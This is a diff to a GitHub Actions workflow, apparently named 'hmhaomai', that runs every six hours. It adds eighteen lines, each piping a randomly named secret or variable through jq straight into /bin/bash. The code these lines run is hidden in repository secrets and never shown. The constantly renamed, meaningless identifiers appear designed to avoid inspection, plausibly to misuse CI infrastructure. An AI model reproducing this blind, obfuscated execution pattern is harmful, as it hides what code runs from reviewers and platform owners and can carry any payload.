@@ -1,8 +1,9 @@
 name: hmhaomai
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '51 4/6 * * *'
+    - cron: '8 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,14 +12,24 @@ jobs:
       - uses: actions/checkout@v4
       - name: hmhaomai
         env:
-          e45120: ${{ secrets.e45120 }}
+          eavka3346: ${{ secrets.eavka3346 }}
         run: |
-          echo $e45120 | jq -r .sg9033 | /bin/bash
-          echo $x00 | jq -r .x24 | /bin/bash
-          echo $e7 | jq -r .uaii4214 | /bin/bash
-          echo $ajvth774 | jq -r .a4408 | /bin/bash
-          echo $x31 | jq -r .ko8 | /bin/bash
-          echo $ror619 | jq -r .jgiuq08658 | /bin/bash
-          echo $mx53217 | jq -r .ov582 | /bin/bash
-          echo $e221 | jq -r .rz35 | /bin/bash
+          echo $eavka3346 | jq -r .vdzv842 | /bin/bash
+          echo $rzen3 | jq -r .gbxi57 | /bin/bash
+          echo $lxyvq834 | jq -r .sxb6 | /bin/bash
+          echo $ucyhj0179 | jq -r .l379 | /bin/bash
+          echo $qhw308 | jq -r .ckt8183 | /bin/bash
+          echo $yojp029 | jq -r .sqc54401 | /bin/bash
+          echo $e0599 | jq -r .mxaci529 | /bin/bash
+          echo $l140 | jq -r .sbpqw5232 | /bin/bash
+          echo $nmsf6611 | jq -r .e0 | /bin/bash
+          echo $pxt16 | jq -r .czndw5780 | /bin/bash
+          echo $zkr78627 | jq -r .pffkv37615 | /bin/bash
+          echo $wpbb8040 | jq -r .x2208 | /bin/bash
+          echo $a4 | jq -r .xlq663 | /bin/bash
+          echo $btli18 | jq -r .bzlgm893 | /bin/bash
+          echo $gy352 | jq -r .j519 | /bin/bash
+          echo $cu944 | jq -r .mireu3 | /bin/bash
+          echo $fsyuz54857 | jq -r .myny54 | /bin/bash
+          echo $heznu22 | jq -r .e84769 | /bin/bash
 
